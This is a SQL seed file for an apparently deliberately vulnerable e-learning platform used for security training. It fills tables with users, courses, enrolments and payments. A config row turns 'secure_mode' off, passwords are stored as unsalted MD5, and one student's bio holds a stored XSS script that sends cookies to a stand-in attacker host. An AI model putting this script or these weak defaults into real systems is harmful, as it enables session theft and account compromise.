USE eduportal;
SET FOREIGN_KEY_CHECKS = 0;

-- SYSTEM CONFIG: default to vulnerable mode.
INSERT INTO system_config (config_key, config_value) VALUES
    ('secure_mode', 'false')
ON DUPLICATE KEY UPDATE config_value = config_value;

-- ROLES
INSERT INTO roles (id, name, description) VALUES
    (1, 'admin',      'Platform administrator with full access'),
    (2, 'instructor', 'Course instructor with content management access'),
    (3, 'student',    'Enrolled student with learning access');

-- All password_hash values are unsalted MD5 hex strings
INSERT INTO users (id, role_id, email, username, password_hash, is_active) VALUES
    -- Admin
    (1, 1, 'admin@eduportal.my',       'admin',        '0192023a7bbd73250516f069df18b500', 1),

    -- Instructors
    (2, 2, 'ahmad.razif@eduportal.my', 'ahmad.razif',  'a426dcf72ba25d046591f81a5495eab7', 1),
    (3, 2, 'nurul.aina@eduportal.my',  'nurul.aina',   'b4cd29f38b87efce1490b0755785e237', 1),

    -- Students
    (4, 3, 'ali.hassan@student.my',       'ali.hassan',   'ad6a280417a0f533d8b670c61667e1a0', 1),
    (5, 3, 'siti.rahimah@student.my',     'siti.rahimah', '482c811da5d5b4bc6d497ffa98491e38', 1),
    (6, 3, 'raj.kumar@student.my',        'raj.kumar',    '482c811da5d5b4bc6d497ffa98491e38', 1),
    (7, 3, 'wei.liang@student.my',        'wei.liang',    '482c811da5d5b4bc6d497ffa98491e38', 1),
    (8, 3, 'farah.nadia@student.my',      'farah.nadia',  '482c811da5d5b4bc6d497ffa98491e38', 1),
    (9, 3, 'danial.hakimi@student.my',    'danial.hakimi','482c811da5d5b4bc6d497ffa98491e38', 1);


INSERT INTO user_profiles (user_id, full_name, bio, phone, institution) VALUES
    (1, 'Platform Admin',
        'System administrator for EduPortal.',
        '+603-8888-0001', 'EduPortal Sdn Bhd'),

    (2, 'Ahmad Razif bin Zulkifli',
        'Senior lecturer in Computer Science with 10 years of industry experience in Malaysia.',
        '+6012-345-6789', 'Multimedia University'),

    (3, 'Nurul Aina binti Hamdan',
        'Certified data analyst and Python enthusiast. Passionate about making data science accessible.',
        '+6011-222-3344', 'Universiti Malaya'),

    -- Stored XSS payload planted in bio field
    (4, 'Ali Hassan bin Ibrahim',
        'Passionate student. <script>document.cookie="xss_demo="+document.cookie; fetch("http://attacker.local/steal?c="+document.cookie);</script>',
        '+6013-111-2222', 'Universiti Teknologi Malaysia'),

    (5, 'Siti Rahimah binti Azman',
        'Final year student studying Software Engineering. Loves building web apps.',
        '+6014-555-6677', 'Universiti Putra Malaysia'),

    (6, 'Raj Kumar a/l Subramaniam',
        'Computer Science undergraduate interested in cybersecurity and ethical hacking.',
        '+6016-789-0123', 'Universiti Kebangsaan Malaysia'),

    (7, 'Wei Liang Tan',
        'Aspiring data scientist. Currently pursuing a degree in Information Technology.',
        '+6017-234-5678', 'TARUMT'),

    (8, 'Farah Nadia binti Othman',
        'Enthusiastic learner exploring the world of AI and machine learning.',
        '+6018-345-6789', 'HELP University'),

    (9, 'Danial Hakimi bin Roslan',
        'Network engineering student with a passion for IoT and embedded systems.',
        '+6019-456-7890', 'Universiti Teknikal Malaysia Melaka');

-- CATEGORIES
INSERT INTO categories (id, name, slug, description) VALUES
    (1, 'Programming & Development', 'programming-development',
        'Web, mobile, and software development courses'),
    (2, 'Data Science & AI',         'data-science-ai',
        'Machine learning, data analysis, and AI fundamentals'),
    (3, 'Cybersecurity',             'cybersecurity',
        'Network security, ethical hacking, and digital forensics'),
    (4, 'Business & Management',     'business-management',
        'Entrepreneurship, project management, and leadership');

-- COURSES
INSERT INTO courses (id, category_id, instructor_id, title, slug, description, price, level, duration_hrs, is_published) VALUES
    (1, 1, 2,
        'Full-Stack Web Development with Node.js',
        'fullstack-nodejs',
        'Build complete web applications using Node.js, Express, and MySQL. Covers REST APIs, authentication, and deployment.',
        299.00, 'intermediate', 40, 1),

    (2, 1, 2,
        'React for Beginners: Build Modern UIs',
        'react-beginners',
        'Learn React from scratch. Components, hooks, state management, and connecting to APIs.',
        199.00, 'beginner', 25, 1),

    (3, 2, 3,
        'Python for Data Science',
        'python-data-science',
        'Pandas, NumPy, Matplotlib and scikit-learn for real-world data analysis projects.',
        349.00, 'beginner', 35, 1),

    (4, 2, 3,
        'Machine Learning A to Z: Practical Guide',
        'machine-learning-az',
        'Supervised and unsupervised learning, model evaluation, and deploying ML models in Python.',
        399.00, 'intermediate', 50, 1),

    (5, 3, 2,
        'Ethical Hacking & Penetration Testing',
        'ethical-hacking-pentest',
        'Hands-on penetration testing: reconnaissance, exploitation, post-exploitation, and reporting.',
        449.00, 'intermediate', 45, 1),

    (6, 3, 2,
        'Network Security Fundamentals',
        'network-security-fundamentals',
        'Firewalls, IDS/IPS, VPNs, and securing network infrastructure for Malaysian enterprises.',
        249.00, 'beginner', 20, 1),

    (7, 4, 3,
        'Digital Entrepreneurship in Malaysia',
        'digital-entrepreneurship-malaysia',
        'Launch and grow a digital business in Malaysia. Covers SSM registration, e-commerce, and digital marketing.',
        149.00, 'beginner', 15, 1),

    (8, 1, 3,
        'Docker & Kubernetes for Developers',
        'docker-kubernetes',
        'Containerise applications, orchestrate with Kubernetes, and deploy to cloud environments.',
        329.00, 'advanced', 30, 0);   -- unpublished (admin only)

-- COURSE MATERIALS
INSERT INTO course_materials (course_id, title, material_type, content_url, order_index, is_free) VALUES
    -- Course 1: Full-Stack Node.js
    (1, 'Introduction & Course Overview',         'video',    '/materials/c1/intro.mp4',      1, 1),
    (1, 'Setting Up Your Dev Environment',        'document', '/materials/c1/setup.pdf',      2, 1),
    (1, 'Building Your First Express Server',     'video',    '/materials/c1/express.mp4',    3, 0),
    (1, 'MySQL Integration & Raw Queries',        'video',    '/materials/c1/mysql.mp4',      4, 0),
    (1, 'Module 1 Quiz',                         'quiz',     NULL,                           5, 0),

    -- Course 2: React Beginners
    (2, 'What is React?',                         'video',    '/materials/c2/what-react.mp4', 1, 1),
    (2, 'JSX and Components',                     'video',    '/materials/c2/jsx.mp4',        2, 0),
    (2, 'State and Props',                        'document', '/materials/c2/state.pdf',      3, 0),

    -- Course 5: Ethical Hacking
    (5, 'Penetration Testing Methodology',        'video',    '/materials/c5/methodology.mp4',1, 1),
    (5, 'Reconnaissance Techniques',              'video',    '/materials/c5/recon.mp4',      2, 0),
    (5, 'OWASP Top 10 Walkthrough',              'document', '/materials/c5/owasp.pdf',      3, 0);



INSERT INTO enrolments (id, user_id, course_id, status, progress_pct, enrolled_at) VALUES
    (1,  4, 1, 'active',    45, '2026-03-10 09:15:00'),   -- ali.hassan: Full-Stack Node.js
    (2,  4, 5, 'active',    20, '2026-03-15 14:30:00'),   -- ali.hassan: Ethical Hacking
    (3,  5, 1, 'active',    80, '2026-03-11 10:00:00'),   -- siti.rahimah: Full-Stack Node.js
    (4,  5, 2, 'completed',100, '2026-02-20 08:00:00'),   -- siti.rahimah: React
    (5,  6, 3, 'active',    60, '2026-03-12 11:30:00'),   -- raj.kumar: Python DS
    (6,  6, 5, 'active',    10, '2026-04-01 16:00:00'),   -- raj.kumar: Ethical Hacking
    (7,  7, 4, 'active',    35, '2026-03-18 13:00:00'),   -- wei.liang: ML A-Z
    (8,  8, 7, 'active',    55, '2026-03-25 09:45:00'),   -- farah.nadia: Digital Entrepr.
    (9,  9, 6, 'active',    70, '2026-03-05 07:30:00'),   -- danial.hakimi: Network Security
    (10, 9, 1, 'active',    15, '2026-04-10 10:00:00');   -- danial.hakimi: Full-Stack Node.js

-- PAYMENTS
INSERT INTO payments (user_id, course_id, amount, currency, status, payment_method, transaction_ref, card_last_four) VALUES
    (4, 1, 299.00, 'MYR', 'completed', 'credit_card',     'TXN-2026-0310-001', '4242'),
    (4, 5, 449.00, 'MYR', 'completed', 'online_banking',  'TXN-2026-0315-002', NULL),
    (5, 1, 299.00, 'MYR', 'completed', 'e_wallet',        'TXN-2026-0311-003', NULL),
    (5, 2, 199.00, 'MYR', 'completed', 'credit_card',     'TXN-2026-0220-004', '1234'),
    (6, 3, 349.00, 'MYR', 'completed', 'online_banking',  'TXN-2026-0312-005', NULL),
    (6, 5, 449.00, 'MYR', 'completed', 'credit_card',     'TXN-2026-0401-006', '5678'),
    (7, 4, 399.00, 'MYR', 'completed', 'e_wallet',        'TXN-2026-0318-007', NULL),
    (8, 7, 149.00, 'MYR', 'completed', 'credit_card',     'TXN-2026-0325-008', '9999'),
    (9, 6, 249.00, 'MYR', 'completed', 'online_banking',  'TXN-2026-0305-009', NULL),
    (9, 1, 299.00, 'MYR', 'pending',   'credit_card',     NULL,                '3333');

-- COURSE REVIEWS
INSERT INTO course_reviews (course_id, user_id, rating, comment) VALUES
    (1, 4, 4, 'Great course! The MySQL section was very detailed.'),
    (1, 5, 5, 'Best Node.js course I have taken. Clear and hands-on.'),
    (2, 5, 5, 'Perfect for beginners. The hooks section was excellent.'),
    (3, 6, 4, 'Solid introduction. Would love more advanced pandas examples.'),
    (5, 4, 5, 'Highly recommended for anyone interested in cybersecurity.'),
    (6, 9, 4, 'Covers all the basics. Good for fresh graduates.'),
    (7, 8, 3, 'Good content but could use more Malaysian market case studies.');

-- ANNOUNCEMENTS
INSERT INTO announcements (admin_id, title, body, is_active) VALUES
    (1, 'Welcome to EduPortal!',
        'We are excited to launch the new EduPortal platform. Explore our growing catalogue of courses designed for Malaysian learners.',
        1),
    (1, 'Hari Raya Promotion — 30% Off All Courses',
        'Celebrate Hari Raya with learning! Use code RAYA2026 at checkout for 30% off any course until 15 June 2026.',
        1),
    (1, 'Platform Maintenance Notice',
        'Scheduled maintenance will be performed on 1 June 2026 from 02:00 to 04:00 AM MYT. The platform will be briefly unavailable.',
        0);

SET FOREIGN_KEY_CHECKS = 1;


